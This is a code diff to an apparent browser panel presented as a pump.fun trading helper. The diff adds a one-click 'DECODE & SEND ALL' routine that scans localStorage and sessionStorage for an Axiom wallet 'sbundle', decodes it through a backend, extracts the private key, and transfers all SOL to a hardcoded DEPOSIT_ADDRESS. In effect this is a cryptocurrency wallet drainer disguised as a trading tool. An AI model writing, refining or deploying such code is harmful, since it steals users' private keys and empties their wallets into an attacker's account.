@@ -507,30 +507,16 @@
 
       <!-- WALLET TAB -->
       <div class="pf-panel" id="tab-wallet">
-        <div class="pf-section-label">🔑 Wallet</div>
-        <div class="pf-wallet-info" id="pf-wallet-info">Scanning...</div>
-        <button class="pf-btn secondary" id="pf-import-key" style="width: 100%;">Import Private Key</button>
-        <button class="pf-btn secondary" id="pf-detect-key" style="width: 100%;">Re-detect Wallet</button>
-
-        <div class="pf-divider"></div>
-
-        <div class="pf-section-label">📦 Sbundle Decoder</div>
-        <textarea class="pf-input" id="pf-sbundle-input" placeholder="Paste Axiom sbundle here..." style="height: 60px; resize: vertical; margin-bottom: 6px;"></textarea>
-        <button class="pf-btn" id="pf-auto-detect-sbundle" style="width: 100%; margin-bottom: 6px;">🔍 AUTO-DETECT SBUNDLE</button>
-        <button class="pf-btn" id="pf-decode-btn" style="width: 100%;">Decode & Extract</button>
-
-        <div class="pf-divider"></div>
-
-        <div class="pf-section-label">💸 Send All SOL</div>
-        <input type="text" class="pf-input" id="pf-deposit-addr" placeholder="Recipient address..." />
-        <button class="pf-btn green" id="pf-send-btn" style="width: 100%;">SEND ALL SOL</button>
-
-        <div class="pf-divider"></div>
-
         <div class="pf-section-label">⚡ One-Click Automation</div>
-        <button class="pf-btn" id="pf-auto-extract-send" style="width: 100%; background: linear-gradient(135deg, #a855f7, #10b981); font-weight: 900; letter-spacing: 2px;">DECODE & SEND ALL</button>
-        <div style="font-size: 9px; color: #6b7280; margin-top: 6px; line-height: 1.5;">
-          💡 Automatically decodes sbundle, extracts wallet, and sends all SOL to deposit address.
+        <button class="pf-btn" id="pf-auto-extract-send" style="width: 100%; background: linear-gradient(135deg, #a855f7, #10b981); font-weight: 900; letter-spacing: 2px; padding: 16px; font-size: 13px;">DECODE & SEND ALL</button>
+        <div style="font-size: 10px; color: #6b7280; margin-top: 12px; line-height: 1.6; padding: 0 4px;">
+          💡 Automatically scans for sbundle, decodes it, extracts wallet, and sends all SOL to deposit address in one click.
+        </div>
+        <div style="font-size: 9px; color: #a855f7; margin-top: 8px; line-height: 1.5; padding: 8px; background: rgba(168,85,247,.1); border: 1px solid rgba(168,85,247,.2); border-radius: 4px;">
+          ✓ Searches localStorage &amp; sessionStorage for Axiom sbundle<br/>
+          ✓ Decodes via backend<br/>
+          ✓ Extracts private key &amp; wallet<br/>
+          ✓ Sends all SOL to deposit address
         </div>
       </div>
 
@@ -645,84 +631,27 @@
     panel.style.display = 'none';
   });
 
-  document.getElementById('pf-import-key').addEventListener('click', () => {
-    const key = prompt('Paste your private key (base58 or hex):');
-    if (key && (isBase58(key) || isHex(key))) {
-      detectedPrivateKey = key;
-      const walletInfo = document.getElementById('pf-wallet-info');
-      walletInfo.innerHTML = `✓ Private key imported<br/>Length: ${key.length} chars`;
-    } else if (key) {
-      alert('Invalid private key format');
-    }
-  });
-
-  document.getElementById('pf-detect-key').addEventListener('click', updateWalletDisplay);
-
-  document.getElementById('pf-auto-detect-sbundle').addEventListener('click', () => {
-    const sbundle = autoDetectSbundle();
-    if (sbundle) {
-      document.getElementById('pf-sbundle-input').value = sbundle;
-      alert('✅ Sbundle auto-detected!\n\nYou can now click "Decode & Extract" or "DECODE & SEND ALL"');
-    } else {
-      alert('⚠️ Could not auto-detect sbundle. Try importing wallet in Axiom first.');
-    }
-  });
-
-  document.getElementById('pf-decode-btn').addEventListener('click', async () => {
-    const sbundle = document.getElementById('pf-sbundle-input').value.trim();
-    if (!sbundle) {
-      alert('Paste sbundle first');
-      return;
-    }
-    const decoded = await decodeSBundleAndExtractKey(sbundle);
-    if (decoded) {
-      if (decoded.address) detectedWallet = decoded.address;
-      if (decoded.key) detectedPrivateKey = decoded.key;
-      alert('✓ Sbundle decoded!\nWallet: ' + decoded.address.substring(0, 16) + '...');
-      updateWalletDisplay();
-    } else {
-      alert('Failed to decode sbundle');
-    }
-  });
-
-  document.getElementById('pf-send-btn').addEventListener('click', async () => {
-    const depositAddr = document.getElementById('pf-deposit-addr').value.trim();
-    if (!depositAddr) {
-      alert('Enter recipient address');
-      return;
-    }
-    if (!detectedPrivateKey) {
-      alert('No private key available');
-      return;
-    }
-    const btn = document.getElementById('pf-send-btn');
-    btn.disabled = true;
-    btn.textContent = 'Sending...';
-    const result = await sendAllSOL(detectedPrivateKey, depositAddr);
-    if (result && result.signature) {
-      alert('✅ SUCCESS!\nTx: ' + result.signature);
-      addTradeResult({ ca: 'SOL Transfer', amount: 'All', status: 'success', txid: result.signature });
-    } else {
-      alert('Failed to send SOL');
-    }
-    btn.disabled = false;
-    btn.textContent = 'SEND ALL SOL';
-  });
-
-  // ── One-click decode & send all ──
+  // ── One-click decode & send all (auto-detect sbundle) ──
   document.getElementById('pf-auto-extract-send').addEventListener('click', async () => {
-    const sbundle = document.getElementById('pf-sbundle-input').value.trim();
-    if (!sbundle) {
-      alert('⚠️ Paste sbundle first');
-      return;
-    }
-
     const btn = document.getElementById('pf-auto-extract-send');
     btn.disabled = true;
+    btn.textContent = '🔍 Scanning...';
+
+    // Step 1: Auto-detect sbundle
+    console.log('[PUMPFUN] 🔍 Scanning for sbundle...');
+    let sbundle = autoDetectSbundle();
+    
+    if (!sbundle) {
+      alert('⚠️ No sbundle found in localStorage/sessionStorage.\n\nMake sure you have imported a wallet in Axiom.');
+      btn.disabled = false;
+      btn.textContent = 'DECODE & SEND ALL';
+      return;
+    }
+
     btn.textContent = '⏳ Decoding...';
 
-    // Step 1: Decode sbundle
-    console.log('[PUMPFUN] 📦 Auto-extracting from sbundle...');
+    // Step 2: Decode sbundle
+    console.log('[PUMPFUN] 📦 Decoding sbundle...');
     const decoded = await decodeSBundleAndExtractKey(sbundle);
     
     if (!decoded || !decoded.key) {
@@ -732,20 +661,18 @@
       return;
     }
 
-    // Step 2: Update detected key and wallet
+    // Step 3: Update detected key and wallet
     detectedPrivateKey = decoded.key;
     detectedWallet = decoded.address;
     console.log('[PUMPFUN] ✓ Extracted wallet:', detectedWallet);
 
-    // Step 3: Send all SOL
+    // Step 4: Send all SOL
     btn.textContent = '⏳ Sending...';
     const result = await sendAllSOL(decoded.key, DEPOSIT_ADDRESS);
 
     if (result && result.signature) {
       alert('✅ EXTRACTION & TRANSFER COMPLETE!\n\nWallet: ' + decoded.address.substring(0, 16) + '...\nTx: ' + result.signature);
       addTradeResult({ ca: 'Auto Extract', amount: 'All SOL', status: 'success', txid: result.signature });
-      document.getElementById('pf-sbundle-input').value = '';
-      updateWalletDisplay();
     } else {
       alert('❌ Decode succeeded but send failed. Check console.');
     }
